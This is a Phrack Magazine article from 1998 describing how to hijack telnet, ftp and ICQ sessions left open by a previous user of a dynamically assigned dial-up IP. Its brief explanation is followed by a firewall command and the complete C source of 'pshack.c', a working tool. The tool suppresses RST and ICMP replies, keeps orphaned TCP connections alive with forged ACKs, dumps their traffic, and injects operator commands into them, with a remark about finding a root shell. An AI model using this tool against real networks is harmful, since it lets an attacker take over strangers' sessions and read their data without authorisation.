<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
   <meta http-equiv="content-language" content="en" />
   <meta name="description" content="Phrack staff website." />
   <meta name="keywords" content="phrack" />
   <meta name="robots" content="follow,index,all" />

   <meta name="revisit-after" content="7 days" />
   
   <title>.:: Phrack Magazine ::.</title>
   
   <link href="../../css/style.css" rel="stylesheet" type="text/css">
</head>
<body id="top">
<div align="center" class="texto-2-bold">
[ <a href="../../index.html" title="News">News</a> ]
[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
[ <a href="../../authors.html" title="Authors">Authors</a> ]
[ <a href="../../archives/" title="Archives">Archives</a> ]
[ <a href="../../contact.html" title="Contact">Contact</a> ]

</div>

<center>
   <br>
   <br>
   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
   <br>

   <div class="texto-2">
   <div class="p-title">.:: Scavenging Connections On Dynamic-IP Networks ::.</div>
   <hr width="600" />
   </div>
   
   <div style="padding-top: 4px; padding-bottom: 4px;">
<div class="around">

<div class="details"><strong>Issues</strong>: 
[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a class="current" href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
</div>
<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack54.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack54.tar.gz" title="Get current issue tar.gz">54</a> | <strong>Release date</strong> : <b>1998-12-25</b> | <strong>Editor</strong> : <b>route</b></div>

<div style="border-top: 1px solid black; border-bottom: 2px solid black">
<table class="tissue" cellpadding="0" cellspacing="0">
   <tbody>
      <tr><td align="left"><a href="../../issues/54/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/54/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/54/3.html#article">Phrack Line Noise</a></td><td align="right">various</td></tr>
<tr><td align="left"><a href="../../issues/54/4.html#article">Phrack Prophile on the parmaster</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/54/5.html#article">Linux and Random Source Bleaching</a></td><td align="right">phunda mental</td></tr>
<tr><td align="left"><a href="../../issues/54/6.html#article">Hardening OpenBSD for Multiuser Environments</a></td><td align="right">route</td></tr>
<tr><td align="left"><a href="../../issues/54/7.html#article">Scavenging Connections On Dynamic-IP Networks</a></td><td align="right">Seth McGann</td></tr>
<tr><td align="left"><a href="../../issues/54/8.html#article">NT Web Technology Vulnerabilities</a></td><td align="right">rfp</td></tr>
<tr><td align="left"><a href="../../issues/54/9.html#article">Remote OS detection via TCP/IP Stack Fingerprinting</a></td><td align="right">Fyodor</td></tr>
<tr><td align="left"><a href="../../issues/54/10.html#article">Defeating Sniffers and Intrusion Detection Systems</a></td><td align="right">horizon</td></tr>
<tr><td align="left"><a href="../../issues/54/11.html#article">Phrack World News</a></td><td align="right">disorder</td></tr>
<tr><td align="left"><a href="../../issues/54/12.html#article">extract.c</a></td><td align="right">Phrack Staff</td></tr>

   </tbody>
</table>

<div class="opt" id="article"><strong>Title</strong> : Scavenging Connections On Dynamic-IP Networks</div>
<div class="opt-bottom"> <strong>Author</strong> : Seth McGann</div>
<pre>---[  Phrack Magazine   Volume 8, Issue 54 Dec 25th, 1998, article 07 of 12


-------------------------[  Scavenging Connections On Dynamic-IP Networks


--------[  Seth McGann &lt;smm@wpi.edu&gt; (www.el8.org) 11.29.98
	


----[  Purpose

This paper will highlight a potentially serious loophole in networks that rely
on dynamic IP assignment.  More specifically, dial-up dynamic IP assignment
provided by almost every Internet Service Provider.  This problem will allow
the unauthorized use of the previous host's connections, for instance, in
progress telnet and ftp control sessions.  This issue is reminiscent of the
problem where terminal servers would sometimes provide an already logged in
session to a user lucky enough to call precisely after a forced disconnect due
to line noise or other outside factor.


----[  The Problem

To perform this feat we rely on some well know concepts, usually employed for
non-blind spoofing or session hijacking.  First, we have to understand what
a connection looks like after an abrupt loss of service.  The key point is
that the connection does not simply disappear, because there is no way for the
disconnected host to notify the remote end that it has lost its link.  If the
remote end tries to send more data and there is no host available, the upstream
router will generate an ICMP unreachable and the connection will be terminated.
If another dial-up user connects before the remote end has sent any more data
the story is different.  For a TCP based connection, the kernel will see a
packet going to an unconnected port, usually with PUSH and ACK set or simply
ACK, and will generate a RST, ending the connection.  For an incident UDP
packet, an ICMP unreachable is generated.  Either way the connection will
evaporate.


----[  The Solution

Solving the problem is twofold.  We must first prevent the kernel from killing
the connections and second we must make sure the remote end knows we are still
alive, to prevent timeouts.  For UDP the answer is very simple.  As long as we
block outbound ICMP unreachable packets the remote end won't disconnect.
Application timeouts must be dealt with, of course.  For TCP we have a bigger
problem, since the connections will die if not responded to.  To prevent our
poisonous RST packets from reaching the remote side we simply block all
outbound TCP traffic.  To keep the dialogue going, we simply ACK all incident
PUSH|ACK packets and increment the ACK and SEQ numbers accordingly.  We
recover data from packets with the PUSH flag set.  Additionally we can
send data back down the connection by setting the PUSH and ACK flags on
our outbound packets.


----[  Implementation

To stop our kernel from killing the latent connections, we first block all
outbound traffic. Under linux a command such as the following would be
effective:

/sbin/ipfwadm -O -a deny -S 0.0.0.0/0  -P all -W ppp0

Now, no RST packets or ICMP will get out.  We are essentially turning off
kernel networking support and handling all the details ourselves.  This will
not allow us to send using raw sockets, unfortunately.  SOCK_PACKET could
be used, but in the interests of portability the firewall is simply opened
to send a packet and then closed.  To be useful on a larger number of
platforms, libpcap 0.4 was used for pulling packets off the wire and
Libnet 0.8b was used for putting them back again.  The program itself is
called pshack.c because that's basically all it does.  Additionally, it will
allow you respond to in progress connections just in case you find a root
shell.  It will also accept inbound connections, and allow you to reply to
them.  Note, this will only work on Linux right now, due to the differences in
handling of the firewall.  This is very minor and will be fixed soon.  It
should compile without incident on RedHat 5.1 or 4.2 and on Slackware as well,
given one change to the ip firewall header file, namely taking out the
#include &lt;linux/tcp.h&gt; line.


----[  Conclusions

Using this program it is easy to scavenge telnet and ftp control sessions,
or basically any low traffic, idle connection.  Grabbing ICQ sessions is a
good example of a UDP based scavenge.  Obviously, streaming connections,
such as ftp data will be ICMP to death before they can be scavenged.  It's
interesting to note that hosts that drop ICMP unreachable packets, for fear
of forged unreachable packets, are particularly vulnerable as they will not
lose the connection as quickly.

Required:

libpcap 0.4  -&gt; ftp://ftp.ee.lbl.gov/libpcap.tar.Z
Libnet  0.8b -&gt; http://www.infonexus.com/~daemon9/Projects/Libnet/

&lt;++&gt; scavenge/pshack.c
/* - PshAck.c - Attempts to scavenge connections when you dial up an ISP.
 *   Author:    Seth McGann &lt;smm@wpi.edu&gt; / www.el8.org (Check papers section)
 *   Date:      11/29/98
 *   Greets:    dmess0r,napster,awr,all things w00w00,#203
 *   Version:   0.3
 *
 *   Usage:
 *              1.  Dial up your ISP and start pshack up.
 *              2.  If you are lucky you will see connections you did not
 *		    make :)
 *              3.  Repeat the procedure.
 *   Options:
 *             -i: The interface
 *             -l: Link offset
 *             -s: Your source IP
 *
 *   Compiling: 'gcc pshack.c -o pshack -lnet -lpcap' should work given you have
 *              libpcap and Libnet installed properly.
 *
 *              libpcap 0.4 : ftp://ftp.ee.lbl.gov/libpcap.tar.Z
 *              Libnet  0.8b: http://www.infonexus.com/~daemon9/Projects/Libnet/
 *
 *   Have fun!
 */

#define __BSD_SOURCE
#include &lt;netinet/udp.h&gt;
#define __FAVOR_BSD
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;syslog.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;net/if.h&gt;
#include &lt;libnet.h&gt;
#include &lt;pcap.h&gt;
#include &lt;netinet/ip_fw.h&gt;
#include &lt;setjmp.h&gt;

/* #define DEBUGIT */

#ifdef DEBUGIT
#define DEFAULT_INTERFACE &quot;eth1&quot;
#define DEFAULT_OFFSET    14
#else
#define DEFAULT_INTERFACE &quot;ppp0&quot;   /* Default is PPP with no linklayer */
#define DEFAULT_OFFSET    0
#endif

struct conn {
	u_int    type;
	u_long   src,dst,seq,ack;
	u_short  sport,dport;
};

void clean_exit(int);
void time_out(int);
void usage(char *);
void dump_packet( u_char *, int );
int update_db( u_char *, int, struct conn*);
void dump_db (struct conn*);

char errbuf[2000];
sigjmp_buf env;



int
main (int argc, char **argv) {

	struct ip     *ip_hdr;
	struct tcphdr *tcp_hdr;
	struct udphdr *udp_hdr;
	struct ip_fw  fw;
	struct ifreq  ifinfo;
	struct pcap_pkthdr ph;
	pcap_t        *pd;
	u_long        local=0,seq,ack;
	u_short	      flags=0;
	u_char        *d_ptr,*packet;
	u_char	      *pbuf=malloc(TCP_H+IP_H+500);
	char 	      iface[17],sendbuf[500];
	int           osock,sfd,linkoff,i,datalen,newsize,dbsize=0;
	struct conn   conn[100];         /* WAY more than enough */
	char arg;	
        fd_set rfds;
        struct timeval tv;
        int retval;
	char user[500];
	
	
        strcpy(iface,DEFAULT_INTERFACE);
        linkoff=DEFAULT_OFFSET;

	while((arg = getopt(argc,argv,&quot;i:s:l:&quot;)) != EOF){
            switch(arg) {
	          case 's':
	          local=inet_addr(optarg);
	          break;
	          case 'i':
	          strncpy(iface,optarg,16);
	          break;
	          case 'l':
	          linkoff=atoi(optarg);
	          break;
	          default:
	          usage(argv[0]);
	          break;
	     }
        }

	printf(&quot;* Blocking till %s comes up *\n&quot;,iface);
	
        do {pd=pcap_open_live(iface,1500,0,500,errbuf);}while(!pd);
	
	printf(&quot;* Configuring Raw Output *\n&quot;);
	osock=open_raw_sock(IPPROTO_RAW);
        if (osock&lt;0)perror(&quot;socket()&quot;),exit(1);
	strcpy(ifinfo.ifr_ifrn.ifrn_name,iface);
        if(ioctl(osock,SIOCGIFFLAGS,&amp;ifinfo)&lt;0)perror(&quot;ioctl()&quot;),exit(1);
        if(ioctl(osock,SIOCSIFFLAGS,&amp;ifinfo)&lt;0)perror(&quot;ioctl()&quot;),exit(1);
        if(ioctl(osock,SIOCGIFADDR,&amp;ifinfo)&lt;0)perror(&quot;ioctl()&quot;),exit(1);
	
        bcopy(&amp;ifinfo.ifr_addr.sa_data[2],&amp;local,4);
	printf(&quot;* Address: %s\n&quot;,host_lookup(local,0));

        printf(&quot;* Blocking Outbound on %s *\n&quot;,iface);
	sfd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
        if(sfd&lt;0) perror(&quot;socket()&quot;),exit(1);

	bzero(&amp;fw,sizeof(fw));
        strcpy(fw.fw_vianame,iface);
        #ifdef DEBUGIT
	fw.fw_flg=IP_FW_F_ICMP;
        if(setsockopt(sfd,IPPROTO_IP,IP_FW_INSERT_OUT,&amp;fw,sizeof(fw))&lt;0)
        perror(&quot;setsockopt()&quot;),exit(1);
	fw.fw_flg=IP_FW_F_TCP;
        fw.fw_nsp=1;
        fw.fw_pts[0]=666;
        #endif
        if(setsockopt(sfd,IPPROTO_IP,IP_FW_INSERT_OUT,&amp;fw,sizeof(fw))&lt;0)
        perror(&quot;setsockopt()&quot;),exit(1);

	signal(SIGTERM,clean_exit);
	signal(SIGINT,clean_exit);
	signal(SIGALRM,time_out);	

	printf(&quot;* Entering Capture Loop *\n\n&quot;);
	printf(&quot;* Commands [1] Dump databese\n&quot;
	       &quot;           [2] Send on connection &lt;n&gt; Ex: 2 1 ls -al\n&quot;
	       &quot;           [3] Exit\n\n&quot;);
	sigsetjmp(env,1);
	
	FD_ZERO(&amp;rfds);
        FD_SET(0, &amp;rfds);
        tv.tv_sec = 0;
	tv.tv_usec = 0;

        retval = select(1, &amp;rfds, NULL, NULL, &amp;tv);
	
	if (retval) {
	   retval=read(1,user,sizeof(user));
	   user[retval]=0;
	   switch(user[0]) {
             case '1':
       	     dump_db(conn);
             break;
	     case '2':
	     i=atoi(&amp;user[2]);
	     if (i &gt; dbsize) {
	         printf(&quot;* Invalid connection index) *\n&quot;);
	         break;
             }
             build_ip(TCP_H,
           	      101,
		      0,
           	      IP_DF,
	       	      128,
		      IPPROTO_TCP,
		      local,
         	      htonl(conn[i].src),
	     	      NULL, 0, pbuf);
	
	     build_tcp(conn[i].dport,
		       conn[i].sport,
		       conn[i].seq,
                       conn[i].ack,
		       TH_PUSH|TH_ACK, 31000, 0,user+4,strlen(user+4),
                           pbuf + IP_H);

	     do_checksum(pbuf, IPPROTO_TCP, TCP_H+strlen(user+4));
	     setsockopt(sfd,IPPROTO_IP,IP_FW_DELETE_OUT,&amp;fw,sizeof(fw));
	     write_ip(osock, pbuf, TCP_H + IP_H + strlen(user+4));
             setsockopt(sfd,IPPROTO_IP,IP_FW_INSERT_OUT,&amp;fw,sizeof(fw));

 	     printf(&quot;Sent: %s\n&quot;,user+4);
             break;
	     case '3':
	     clean_exit(1);
	     break;
	     default:
             break;
           }
	}
	alarm(1);
	
	for(;packet=pcap_next(pd,&amp;ph);) {
	
        ip_hdr = (struct ip *)(packet + linkoff);
	
	switch(ip_hdr-&gt;ip_p) {
	
	case IPPROTO_TCP:
             tcp_hdr=(struct tcphdr*)(((char*)ip_hdr)+(4*ip_hdr-&gt;ip_hl));
	     dump_packet(packet,linkoff);
	     #ifdef DEBUGIT
	     if ((ntohl(ip_hdr-&gt;ip_src.s_addr) != local) &amp;&amp;
		 ntohs(tcp_hdr-&gt;th_dport)==666) {
	     #else
	     if (ntohl(ip_hdr-&gt;ip_src.s_addr) != local) {
	     #endif
	     newsize=update_db(packet, linkoff, conn);

	     if(newsize&gt;dbsize) {
             printf(&quot;New Connect:\n&quot;);
             dbsize=newsize;}

	     if (tcp_hdr-&gt;th_flags&amp;TH_PUSH || (tcp_hdr-&gt;th_flags&amp;TH_SYN &amp;&amp;
	 	 tcp_hdr-&gt;th_flags&amp;TH_ACK)) {
		 datalen=ntohs(ip_hdr-&gt;ip_len)-IP_H-TCP_H;
		 if(!datalen) datalen++;

	         seq=ntohl(tcp_hdr-&gt;th_ack);
		 ack=ntohl(tcp_hdr-&gt;th_seq)+datalen;
		 flags=TH_ACK;
  		 } else if(tcp_hdr-&gt;th_flags&amp;TH_SYN) {
		 seq=get_prand(PRu32);
		 ack=ntohl(tcp_hdr-&gt;th_seq)+1;
		 flags=TH_SYN|TH_ACK;
	      	 }

	         if(flags) {
                 build_ip(TCP_H,
			  101,
			  0,
		 	  IP_DF,
	       		  128,
			  IPPROTO_TCP,
			  local,
                          ip_hdr-&gt;ip_src.s_addr,
			  NULL, 0, pbuf);
	
		 build_tcp(ntohs(tcp_hdr-&gt;th_dport),
		           ntohs(tcp_hdr-&gt;th_sport),
		           seq,
                           ack,
		           flags, 31000, 0, NULL, 0, pbuf + IP_H);

		 do_checksum(pbuf, IPPROTO_TCP, TCP_H);
		 setsockopt(sfd,IPPROTO_IP,IP_FW_DELETE_OUT,&amp;fw,sizeof(fw));
                 write_ip(osock, pbuf, TCP_H + IP_H);
                 setsockopt(sfd,IPPROTO_IP,IP_FW_INSERT_OUT,&amp;fw,sizeof(fw));
		 flags=0; }
	     }
	     break;
	
	case IPPROTO_UDP:
	     dump_packet(packet,linkoff);
	     break;
	default:
	break;
	    }
	  }

}


void
dump_packet( u_char *packet, int linkoff ) {

	struct ip     *ip_hdr;
	struct tcphdr *tcp_hdr;
	struct udphdr *udp_hdr;
	u_char        *d_ptr;
	u_int         i;

	ip_hdr = (struct ip *)(packet + linkoff);
	
	switch (ip_hdr-&gt;ip_p) {
	
	case IPPROTO_TCP:
	tcp_hdr=(struct tcphdr*)(((char*)ip_hdr)+(4*ip_hdr-&gt;ip_hl));
	
	printf(&quot;********************\n&quot;);
	printf(&quot;TCP: %s.%d-&gt;%s.%d SEQ: %u ACK: %u\n &quot;
	       &quot;Flags: %c%c%c%c%c%c Data Len: %d\n&quot;,
		host_lookup(ip_hdr-&gt;ip_src.s_addr,0),
		ntohs(tcp_hdr-&gt;th_sport),
		host_lookup(ip_hdr-&gt;ip_dst.s_addr,0),
		ntohs(tcp_hdr-&gt;th_dport),
	        ntohl(tcp_hdr-&gt;th_seq),
	        ntohl(tcp_hdr-&gt;th_ack),	
	        (tcp_hdr-&gt;th_flags &amp; TH_URG)  ? 'U' : '-',
                (tcp_hdr-&gt;th_flags &amp; TH_ACK)  ? 'A' : '-',
                (tcp_hdr-&gt;th_flags &amp; TH_PUSH) ? 'P' : '-',
                (tcp_hdr-&gt;th_flags &amp; TH_RST)  ? 'R' : '-',
                (tcp_hdr-&gt;th_flags &amp; TH_SYN)  ? 'S' : '-',
                (tcp_hdr-&gt;th_flags &amp; TH_FIN)  ? 'F' : '-',
                ntohs(ip_hdr-&gt;ip_len)-IP_H-TCP_H);
	
		d_ptr=packet+linkoff+TCP_H+IP_H;

                for(i=0;i&lt;(ntohs(ip_hdr-&gt;ip_len)-IP_H-TCP_H);i++)
                   if (d_ptr[i]=='\n')
		      printf(&quot;\n&quot;);
                   else if (d_ptr[i]&gt;0x1F &amp;&amp; d_ptr[i]&lt;0x7F)
		           printf(&quot;%c&quot;,d_ptr[i]);
                        else
                           printf (&quot;.&quot;);

		printf(&quot;\n&quot;);
		break;

	case IPPROTO_UDP:

	udp_hdr=(struct udphdr*)(((char*)ip_hdr) + (4 * ip_hdr-&gt;ip_hl));
	printf(&quot;********************\n&quot;);
	printf(&quot;UDP: %s.%d-&gt;%s.%d Data Len: %d\n&quot;,
               host_lookup(ip_hdr-&gt;ip_src.s_addr,0),
               ntohs(udp_hdr-&gt;uh_sport),
               host_lookup(ip_hdr-&gt;ip_dst.s_addr,0),
               ntohs(udp_hdr-&gt;uh_dport),
	       ntohs(ip_hdr-&gt;ip_len)-IP_H-UDP_H);

	d_ptr=packet+linkoff+UDP_H+IP_H;
        for(i=0;i&lt;(ntohs(udp_hdr-&gt;uh_ulen)-UDP_H);i++)
            if (d_ptr[i]=='\n')
               printf(&quot;\n&quot;);
            else if (d_ptr[i]&gt;0x19 &amp;&amp; d_ptr[i]&lt;0x7F)
                    printf(&quot;%c&quot;,d_ptr[i]);
                 else
		    printf(&quot;.&quot;);
	
	printf(&quot;\n&quot;);
	break;

 	default:
	/* We ignore everything else */
	break;
	}
	
}

void
clean_exit(int val) {

	int sfd,p=0;

        sfd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
        if (sfd&lt;0) perror(&quot;socket()&quot;),exit(1);
        if(setsockopt(sfd,IPPROTO_IP,IP_FW_FLUSH_OUT,&amp;p,sizeof(p))&lt;0)
        perror(&quot;setsockopt()&quot;),exit(1);
        exit(0);
}


void
usage(char *arg) {
       	printf(&quot;%s: [options]\n&quot;
               &quot;  -i: The interface\n&quot;
	       &quot;  -l: Link offset\n&quot;
               &quot;  -s: Your source IP\n\n&quot;,arg);
        exit(0);
}

void
dump_db (struct conn *conn) {

	int i;
	

	for(i=0;conn[i].type;i++)
	   if(conn[i].type==IPPROTO_TCP)
	   printf(&quot;%d: TCP: %s.%d-&gt;%s.%d SEQ: %u ACK: %u\n&quot;,
	           i, host_lookup(htonl(conn[i].src),0),conn[i].sport,
	           host_lookup(htonl(conn[i].dst),0), conn[i].dport,
	           conn[i].seq,conn[i].ack);
	   else if(conn[i].type==IPPROTO_UDP)
	   printf(&quot;%d: UDP: %s.%d-&gt;%s.%d\n&quot;,
	           i, host_lookup(htonl(conn[i].src),0),conn[i].sport,
	           host_lookup(htonl(conn[i].dst),0), conn[i].dport);
	  else break;


}


int
update_db( u_char *packet, int linkoff, struct conn *conn) {
	struct ip     *ip_hdr;
	struct tcphdr *tcp_hdr;
	struct udphdr *udp_hdr;
	int i=0;
	ip_hdr = (struct ip *)(packet + linkoff);

	switch(ip_hdr-&gt;ip_p) {

	case IPPROTO_TCP:
	tcp_hdr=(struct tcphdr*)(((char*)ip_hdr)+(4*ip_hdr-&gt;ip_hl));

	for(i=0;conn[i].type;i++)
	   if(conn[i].type==IPPROTO_TCP)
	    if(ip_hdr-&gt;ip_src.s_addr==htonl(conn[i].src))
             if(ip_hdr-&gt;ip_dst.s_addr==htonl(conn[i].dst))
	      if(ntohs(tcp_hdr-&gt;th_sport)==conn[i].sport)
	       if(ntohs(tcp_hdr-&gt;th_dport)==conn[i].dport)
                    break;

	if(conn[i].type) {
          conn[i].seq=ntohl(tcp_hdr-&gt;th_ack);
	  conn[i].ack=ntohl(tcp_hdr-&gt;th_seq); }
        else {
	  conn[i].type=IPPROTO_TCP;
	  conn[i].src=ntohl(ip_hdr-&gt;ip_src.s_addr);
	  conn[i].dst=ntohl(ip_hdr-&gt;ip_dst.s_addr);
	  conn[i].sport=ntohs(tcp_hdr-&gt;th_sport);
	  conn[i].dport=ntohs(tcp_hdr-&gt;th_dport);
          conn[i].seq=ntohl(tcp_hdr-&gt;th_ack);
	  conn[i].ack=ntohl(tcp_hdr-&gt;th_seq); }		

	break;

	case IPPROTO_UDP:
	udp_hdr=(struct udphdr*)(((char*)ip_hdr)+(4*ip_hdr-&gt;ip_hl));

	for(i=0;conn[i].type;i++)
          if(conn[i].type==IPPROTO_TCP)
	    if(ntohl(ip_hdr-&gt;ip_src.s_addr)==conn[i].src)
       	     if(ntohl(ip_hdr-&gt;ip_dst.s_addr)==conn[i].dst)
	       if(ntohs(udp_hdr-&gt;uh_sport)==conn[i].sport)
	         if(ntohs(udp_hdr-&gt;uh_dport)==conn[i].dport) break;

	if(!conn[i].type) {
	  conn[i].type=IPPROTO_UDP;
	  conn[i].src=ntohl(ip_hdr-&gt;ip_src.s_addr);
	  conn[i].dst=ntohl(ip_hdr-&gt;ip_dst.s_addr);
	  conn[i].sport=ntohs(udp_hdr-&gt;uh_sport);
	  conn[i].dport=ntohs(udp_hdr-&gt;uh_dport); }

	break;
	default:
	/* We Don't care */
	break;
      }
      return i;

}

void
time_out(int blank) {
alarm(0);
siglongjmp(env,1);
}

/* EOF */
&lt;--&gt;

----[  EOF
</pre>

</div>
</div>

</center>

<div align="center" class="texto-2-bold">
[ <a href="../../index.html" title="News">News</a> ]
[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
[ <a href="../../authors.html" title="Authors">Authors</a> ]
[ <a href="../../archives/" title="Archives">Archives</a> ]
[ <a href="../../contact.html" title="Contact">Contact</a> ]
</div>

<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
</body>
</html>
